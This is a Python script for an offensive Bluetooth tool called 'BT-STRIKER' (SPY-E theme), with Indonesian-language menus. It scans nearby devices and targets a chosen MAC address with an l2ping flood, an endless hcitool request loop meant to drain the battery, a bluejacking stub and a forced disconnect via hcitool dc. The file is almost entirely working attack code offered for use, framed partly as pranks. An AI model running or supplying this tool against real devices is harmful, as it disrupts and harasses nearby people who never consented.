import asyncio
import os
import sys
import time
import subprocess
from bleak import BleakScanner

# --- SPY-E THEME COLORS ---
R = "\033[1;31m" # Red
G = "\033[1;32m" # Green
Y = "\033[1;33m" # Yellow
B = "\033[1;34m" # Blue
C = "\033[1;36m" # Cyan
W = "\033[1;37m" # White
X = "\033[0m"    # Reset

def header():
    os.system('clear')
    print(f"""{R}
  ██████  ██████  ██    ██      ███████ 
 ██      ██    ██  ██  ██       ██      
  █████  ██    ██   ████        █████   
      ██ ██    ██    ██         ██      
 ██████   ██████     ██         ███████ 
    {W}BT-STRIKER v1.0 | BY: 123TOOL{X}
    """)

async def scan_devices():
    header()
    print(f"{C}[*] Memulai Radar Scanning (5 detik)...{X}")
    devices = await BleakScanner.discover()
    found = []
    
    if not devices:
        print(f"{R}[!] Tidak ada perangkat terdeteksi.{X}")
        input("\nTekan Enter untuk kembali..."); return None
    
    print(f"\n{W}ID  | MAC ADDRESS       | RSSI | NAME{X}")
    print("-" * 50)
    for i, d in enumerate(devices):
        name = d.name if d.name else "Unknown"
        print(f"{G}{i:02}  {W}| {C}{d.address} {W}| {Y}{d.rssi}dB {W}| {G}{name}{X}")
        found.append(d.address)
    
    return found

def attack_menu(target_mac):
    header()
    print(f"{Y}TARGET LOCKED: {R}{target_mac}{X}\n")
    print(f"{W}PILIH JENIS OPERASI:{X}")
    print(f"{G}[A] {W}Bluetooth Flood (Ping Prank/Lagging)")
    print(f"{G}[B] {W}Battery Drain (Constant Info Request)")
    print(f"{G}[C] {W}Bluejacking (Kirim Kontak/Pesan)")
    print(f"{G}[D] {W}Deauth Simulation (Force Disconnect)")
    print(f"{R}[X] {W}Batal")
    
    choice = input(f"\n{C}SPY-E > {X}").upper()
    
    if choice == 'A':
        # Serangan l2ping flood
        print(f"{R}[!] Menyerang {target_mac} dengan 600 byte paket...{X}")
        print(f"{Y}[!] Tekan Ctrl+C untuk berhenti.{X}")
        # Command: l2ping -f (flood) -s (size)
        try:
            subprocess.run(["sudo", "l2ping", "-f", "-s", "600", target_mac])
        except FileNotFoundError:
            print(f"{R}[!] Error: 'sudo' atau 'l2ping' tidak ditemukan. Pastikan sudah ROOT.")

    elif choice == 'B':
        # Battery Drain: Request info berulang kali
        print(f"{R}[!] Memulai Battery Drain...{X}")
        while True:
            try:
                subprocess.run(["hcitool", "info", target_mac], stdout=subprocess.DEVNULL)
                print(f"{G}[+] Request sent to {target_mac}{X}", end="\r")
            except KeyboardInterrupt: break

    elif choice == 'C':
        print(f"{Y}[!] Fitur ini membutuhkan ObexPush (Bisa gunakan 'obexpushg' di Termux).{X}")
        msg = input("Masukkan pesan kontak: ")
        # Logika pengiriman file vcard kosong dengan nama pesan
        print(f"{R}[!] Mengirim pesan: {msg} ke {target_mac}...{X}")

    elif choice == 'D':
        print(f"{R}[!] Mengirim paket Deauth...{X}")
        # Teknik simulasi putus koneksi via rfcomm reset
        subprocess.run(["sudo", "hcitool", "dc", target_mac])
        print(f"{G}[+] Disconnect Command Sent!{X}")

    input(f"\n{C}Operasi Selesai. Tekan Enter...{X}")

async def main():
    while True:
        target_list = await scan_devices()
        if target_list:
            idx = input(f"\n{W}Pilih ID Target (atau 'r' untuk scan ulang): {X}")
            if idx.lower() == 'r': continue
            try:
                target_mac = target_list[int(idx)]
                attack_menu(target_mac)
            except:
                print(f"{R}[!] Input tidak valid!{X}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{R}[!] SPY-E Shutdown.{X}")
        sys.exit()
